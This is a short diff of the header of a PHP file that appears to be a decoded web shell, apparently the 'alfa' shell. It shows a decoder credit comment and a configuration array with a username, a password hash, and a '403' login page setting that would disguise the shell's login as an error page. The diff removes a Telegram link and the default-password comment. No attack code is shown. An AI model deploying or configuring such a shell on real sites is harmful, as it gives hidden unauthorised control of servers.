@@ -1,13 +1,12 @@
 <?php
 /*
-  Decode By :  	www.sans.eu.org
-	Telegram: 	https://telegram.me/bangkit
+  	Decode By :  	www.sans.eu.org
 	Email:   	bangkit@sans.eu.org
 	Date:		Monday, September 14, 2020
 */
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
-    'password' => '02fdb4efcbc51a17b136dd7ed1e575d7', //Default : "www.sans.eu.org"
+    'password' => '02fdb4efcbc51a17b136dd7ed1e575d7',
     'safe_mode' => '0',
     'login_page' => '403',
     'show_icons' => '1',
